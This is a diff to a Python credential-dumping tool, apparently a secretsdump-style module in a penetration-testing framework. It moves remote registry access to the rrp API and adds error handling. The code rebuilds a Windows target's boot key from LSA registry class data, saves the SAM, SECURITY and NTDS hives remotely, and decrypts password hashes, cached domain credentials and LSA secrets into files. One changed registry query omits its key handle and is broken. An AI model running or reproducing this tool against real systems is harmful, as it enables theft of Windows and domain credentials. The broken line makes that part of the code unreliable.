@@ -10,10 +10,10 @@ from lib.structures import *
 ####################################################################
 class RemoteOperations:
     def __init__(self):
-        self.__boot_key = ''
-        self.__dce = None
+        self.__bootKey = ''
+        self.__rrp = None
         self.__disabled = False
-        self.__reg_handle = None
+        self.__regHandle = None
         self.__service_name = 'RemoteRegistry'
         self.__should_stop = False
         self.__started = False
@@ -23,10 +23,9 @@ class RemoteOperations:
     def __connect_winreg(self):
         rpc = transport.DCERPCTransportFactory(self.__string_binding_winreg)
         rpc.set_smb_connection(self.smb)
-        self.__dce = dcerpc.DCERPC_v5(rpc)
-        self.__dce.connect()
-        self.__dce.bind(winreg.MSRPC_UUID_WINREG)
-        self.__winreg = winreg.DCERPCWinReg(self.__dce)
+        self.__rrp = rpc.get_dce_rpc()
+        self.__rrp.connect()
+        self.__rrp.bind(rrp.MSRPC_UUID_RRP)
 
     def __check_remote_registry(self):
         status = self.status(self.__service_name, return_status=True)
@@ -58,44 +57,36 @@ class RemoteOperations:
         self.__check_remote_registry()
         self.__connect_winreg()
 
-    def get_boot_key(self):
-        boot_key = ''
-        ans = self.__winreg.openHKLM()
-        self.__reg_handle = ans.get_context_handle()
+    def get_bootKey(self):
+        bootKey = ''
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
 
         for key in ['JD','Skew1','GBG','Data']:
             logger.debug('Retrieving class info for %s'% key)
-            ans = self.__winreg.regOpenKey(self.__reg_handle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key,winreg.KEY_READ)
-            key_handle = ans.get_context_handle()
-            ans = self.__winreg.regGetClassInfo(key_handle)
-            boot_key = boot_key + ans.get_class_data()[:-1]
-            self.__winreg.regCloseKey(key_handle)
+            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
+            keyHandle = ans['phkResult']
+            ans = rrp.hBaseRegQueryInfoKey(self.__rrp, keyHandle)
+            bootKey =  bootKey + ans['lpClassOut'][:-1]
+            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
 
         transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
-        boot_key = boot_key.decode('hex')
+        bootKey = bootKey.decode('hex')
 
-        for i in xrange(len(boot_key)):
-            self.__boot_key += boot_key[transforms[i]]
+        for i in xrange(len(bootKey)):
+            self.__bootKey += bootKey[transforms[i]]
 
-        logger.info('Target system bootKey: 0x%s' % self.__boot_key.encode('hex'))
+        logger.info('Target system bootKey: 0x%s' % self.__bootKey.encode('hex'))
 
-        return self.__boot_key
+        return self.__bootKey
 
     def check_noLMhash_policy(self):
         logger.debug('Checking NoLMHash Policy')
-        noLMHash = None
-
-        try:
-            ans = self.__winreg.openHKLM()
-            self.__reg_handle = ans.get_context_handle()
-            ans = self.__winreg.regOpenKey(self.__reg_handle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', winreg.KEY_READ)
-            key_handle = ans.get_context_handle()
-            ans = self.__winreg.regQueryValue(key_handle, 'nolmhash', 10)
-            noLMHash = ans.get_data()
-        # This exception happens on Windows <= 2000 because the registry
-        # hive does not exist
-        except Exception, _:
-            pass
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
+        keyHandle = ans['phkResult']
+        dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
 
         if noLMHash == 1:
             logger.debug('LM hashes are NOT being stored')
@@ -106,23 +97,20 @@ class RemoteOperations:
 
     def __retrieve_hive(self, hive_name):
         temp_filename = '%s' % ''.join([random.choice(string.letters) for i in range(8)])
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        regHandle = ans['phKey']
+
+        try:
+            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hive_name)
+        except:
+            raise registryKey('Cannot open %s hive' % hive_name)
 
         logger.debug('Saving %s hive to %s' % (hive_name, temp_filename))
 
-        ans = self.__winreg.openHKLM()
-        reg_handle = ans.get_context_handle()
-        ans = self.__winreg.regCreateKey(reg_handle, hive_name)
-
-        if ans.get_return_code() != 0:
-            raise registryKey('Cannot open %s hive' % hive_name)
-
-        key_handle = ans.get_context_handle()
-
-        # Save the registry hive to a remote file
-        # TODO: why is the file saved in C:\WINDOWS\System32?
-        self.__winreg.regSaveKey(key_handle, temp_filename)
-        self.__winreg.regCloseKey(key_handle)
-        self.__winreg.regCloseKey(reg_handle)
+        keyHandle = ans['phkResult']
+        resp = rrp.hBaseRegSaveKey(self.__rrp, keyHandle, temp_filename)
+        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
 
         # Open the temporary remote file, so it can be read later
         #remote_fp = RemoteFile(self.smb, ntpath.join('\\', temp_filename), share=DataStore.writable_share)
@@ -196,13 +184,13 @@ class RemoteOperations:
 
     def get_default_login_account(self):
         try:
-            ans = self.__winreg.regOpenKey(self.__reg_handle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', winreg.KEY_READ)
-            key_handle = ans.get_context_handle()
-            ans = self.__winreg.regQueryValue(key_handle, 'DefaultUserName', 512)
-            username = ans.get_data()
-            ans = self.__winreg.regQueryValue(key_handle, 'DefaultDomainName', 512)
-            domain = ans.get_data()
-            self.__winreg.regCloseKey(key_handle)
+            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
+            keyHandle = ans['phkResult']
+            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
+            username = dataValue[:-1]
+            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, 'DefaultDomainName')
+            domain = dataValue[:-1]
+            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
 
             if len(domain) > 0:
                 return '%s\\%s' % (domain, username)
@@ -235,7 +223,7 @@ class RemoteOperations:
 
     def finish(self):
         self.__restore()
-        self.__dce.disconnect()
+        self.__rrp.disconnect()
 
 class CryptoCommon:
     # Common crypto stuff used over different classes
@@ -316,11 +304,11 @@ class OfflineRegistry:
         self.__registry_hive.close()
 
 class SAMHashes(OfflineRegistry):
-    def __init__(self, samFile, boot_key):
+    def __init__(self, samFile, bootKey):
         OfflineRegistry.__init__(self, samFile)
         self.__samFile = samFile
         self.__hashedBootKey = ''
-        self.__boot_key = boot_key
+        self.__bootKey = bootKey
         self.__cryptoCommon = CryptoCommon()
         self.__itemsFound = {}
 
@@ -330,7 +318,7 @@ class SAMHashes(OfflineRegistry):
         DIGITS = "0123456789012345678901234567890123456789\0"
         F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]
         domainData = DOMAIN_ACCOUNT_F(F)
-        rc4Key = MD5(domainData['Key0']['Salt'] + QWERTY + self.__boot_key + DIGITS)
+        rc4Key = MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)
         rc4 = ARC4.new(rc4Key)
         self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])
 
@@ -417,11 +405,11 @@ class SAMHashes(OfflineRegistry):
             fd.close()
 
 class LSASecrets(OfflineRegistry):
-    def __init__(self, securityFile, boot_key):
+    def __init__(self, securityFile, bootKey):
         OfflineRegistry.__init__(self, securityFile)
 
         self.__hashedBootKey = ''
-        self.__boot_key = boot_key
+        self.__bootKey = bootKey
         self.__LSAKey = ''
         self.__NKLMKey = ''
         self.__vistaStyle = True
@@ -494,13 +482,13 @@ class LSASecrets(OfflineRegistry):
         if self.__vistaStyle is True:
             # ToDo: There could be more than one LSA Keys
             record = LSA_SECRET(value)
-            tmpKey = self.__sha256(self.__boot_key, record['EncryptedData'][:32])
+            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
             plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
             record = LSA_SECRET_BLOB(plainText)
             self.__LSAKey = record['Secret'][52:][:32]
         else:
             md5 = hashlib.new('md5')
-            md5.update(self.__boot_key)
+            md5.update(self.__bootKey)
 
             for i in range(1000):
                 md5.update(value[60:76])
@@ -775,8 +763,8 @@ class NTDSHashes(object):
             ('EncryptedHash',':'),
         )
 
-    def __init__(self, ntds_file, boot_key, history=False, noLMHash=True):
-        self.__boot_key = boot_key
+    def __init__(self, ntds_file, bootKey, history=False, noLMHash=True):
+        self.__bootKey = bootKey
         self.__ntds_file = ntds_file
         self.__history = history
         self.__no_LMhash = noLMHash
@@ -811,7 +799,7 @@ class NTDSHashes(object):
         if pek is not None:
             encryptedPek = self.PEK_KEY(pek)
             md5 = hashlib.new('md5')
-            md5.update(self.__boot_key)
+            md5.update(self.__bootKey)
 
             for i in range(1000):
                 md5.update(encryptedPek['KeyMaterial'])
@@ -924,13 +912,25 @@ class NTDSHashes(object):
 
             # Now let's keep moving through the NTDS file and decrypting what we find
             while True:
-                record = self.__ESEDB.getNextRow(self.__cursor)
+                try:
+                    record = self.__ESEDB.getNextRow(self.__cursor)
+                except:
+                    logger.error('Error while calling getNextRow(), trying the next one')
+                    continue
 
                 if record is None:
                     break
 
-                if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
-                    self.__decryptHash(record)
+                try:
+                    if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
+                        self.__decryptHash(record)
+                except Exception, e:
+                    try:
+                        logger.error('Error while processing row for user %s' % record[self.NAME_TO_INTERNAL['name']])
+                        logger.error(str(e))
+                    except:
+                        logger.error('Error while processing row!')
+                        logger.error(str(e))
 
     def exportNTDS(self):
         if len(self.__itemsFound) > 0:
@@ -938,7 +938,13 @@ class NTDSHashes(object):
             fd = open('%s-ntds.txt' % DataStore.server_host, 'w+')
 
             for item in items:
-                fd.write('%s\n' % self.__itemsFound[item])
+                try:
+                    fd.write('%s\n' % self.__itemsFound[item])
+                except Exception, e:
+                    try:
+                        logger.error('Error writing entry %d, skipping' % item)
+                    except:
+                        logger.error('Error writing entry, skipping')
 
             fd.close()
 
@@ -958,24 +964,24 @@ class SecretsDump(RemoteOperations, SAMHashes, LSASecrets, NTDSHashes):
     def secretsdump(self, history=False):
         self.__history = True if history and history.upper().startswith('Y') else False
         self.enable_registry()
-        boot_key = self.get_boot_key()
+        bootKey = self.get_bootKey()
 
         # Let's check whether target system stores LM hashes
         self.__no_LMhash = self.check_noLMhash_policy()
 
-        SAMHashes.__init__(self, self.saveSAM(), boot_key)
+        SAMHashes.__init__(self, self.saveSAM(), bootKey)
         self.dumpSAM()
         self.exportSAM()
         self.finish_hive()
 
-        LSASecrets.__init__(self, self.saveSECURITY(), boot_key)
+        LSASecrets.__init__(self, self.saveSECURITY(), bootKey)
         self.dumpCachedHashes()
         self.exportCached()
         self.dumpSecrets()
         self.exportSecrets()
         self.finish_hive()
 
-        NTDSHashes.__init__(self, self.saveNTDS(), boot_key, history=self.__history, noLMHash=self.__no_LMhash)
+        NTDSHashes.__init__(self, self.saveNTDS(), bootKey, history=self.__history, noLMHash=self.__no_LMhash)
         self.dumpNTDS()
         self.exportNTDS()
         self.finishNTDS()
